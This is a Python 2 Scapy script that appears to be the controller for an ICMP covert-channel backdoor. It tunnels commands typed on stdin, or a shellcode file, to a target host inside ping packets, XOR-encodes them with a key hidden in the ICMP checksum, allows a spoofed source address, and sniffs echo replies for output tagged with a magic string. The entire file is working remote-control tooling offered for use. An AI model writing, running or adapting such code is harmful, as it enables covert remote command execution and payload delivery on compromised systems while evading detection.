from scapy.all import *
import thread
import getopt


########## functions ############
def usage():
   print "Usage:"
   print "\tpython %s -i <iface> -d <dst_ip> [-s <src_ip>] [-f <shellcode_file>] [-h]" % sys.argv[0]
   print "\t\tdst_ip: the host we are communicating with (Can be broadcast) (REQUIRED)"
   print "\t\tiface: interface to send from and listen on (Default: eth0)"
   print "\t\tsrc_ip: the address we want to send from (Can be anything)"
   print "\t\tshellcode_file: send shellcode from this file to run on the host"
   print
   sys.exit(0)

def parse_args():
   global iface, dst_ip, src_ip, shellcode_file

   try:
      opts, args = getopt.gnu_getopt(sys.argv[1:], 'i:d:s:f:h', \
         ['interface=', 'destination=', 'source=', 'shellcode=', 'help'])

   except getopt.GetoptError, err:
      usage()    

   for o, a in opts:
      if o in ('-i', '--interface'):
         iface = a
      if o in ('-d', '--destination'):
         dst_ip = a
      if o in ('-s', '--source'):
         src_ip = a
      if o in ('-f', '--shellcode'):
         shellcode_file = a
      if o in ('-h', '--help'):
         usage()

def generate_key_info():
   return random.randint(0,65535)

def generate_key(key_info):
   key = [0, 0]

   key[0] = key_info & 0xFF
   key[1] = (key_info >> 8) & 0xFF

   return key


def crypt_data(data, key):
   encrypted_data = ""

   if len(data) < 18:
      data += ("\x00" * (len(data) % 18))

   for c in data:
	   encrypted_data += chr((ord(c) ^ key[0]) ^ key[1])

   return encrypted_data

def build_pkt(src, dst, data, key_info):
   ip = IP(dst=dst)

   if src_ip:
      ip.src = src

   return ip/ICMP(type=8, code=0, chksum=key_info)/data

def sniff_packet(pkt):
   global magic 

   if pkt[ICMP] and pkt[ICMP].chksum and pkt[ICMP].type == 0 and pkt[ICMP].code == 0:
      data = crypt_data(pkt.load, generate_key(pkt[ICMP].chksum))

      if data.startswith(magic):
         print data[len(magic) + 1:]

def start_listener(iface, *args):
   sniff(filter="icmp", iface=iface, prn=sniff_packet)

def send_shellcode():
   global MSG_TYPE_SHELLCODE, magic, iface, shellcode_file

   # Open and read the shellcode
   f = open(shellcode_file, 'r')
   shellcode = magic + MSG_TYPE_SHELLCODE + f.read()
   f.close()

   # Get the required crypto bits
   key_info = generate_key_info()
   key = generate_key(key_info)
   encrypted_data = crypt_data(shellcode, key)

   # Now send it
   send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)

########### main #############
MSG_TYPE_SHELLCODE = '\x01'
MSG_TYPE_COMMAND = '\x02'

magic = "GOATSE"
iface = "eth0"
src_ip = ""
dst_ip = ""
shellcode_file = ""

# We need use rand for key generation
random.seed()

# Parse the arguments
parse_args()

# Make sure we at least have a destination
if dst_ip == "":
   print "ERROR: Destination must be specified"
   usage()

# Do we send shellcode or start a shell
if shellcode_file != "":
	send_shellcode()
	print "Shellcode sent"
	sys.exit(0)

# Create the listener thread
thread.start_new_thread(start_listener, (iface, None))

# Now just read our input and send commands
while 1:
   line = sys.stdin.readline().rstrip('\n')
   key_info = generate_key_info()
   key = generate_key(key_info)
   encrypted_data = crypt_data(magic + "\x02" + line, key)

   send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)


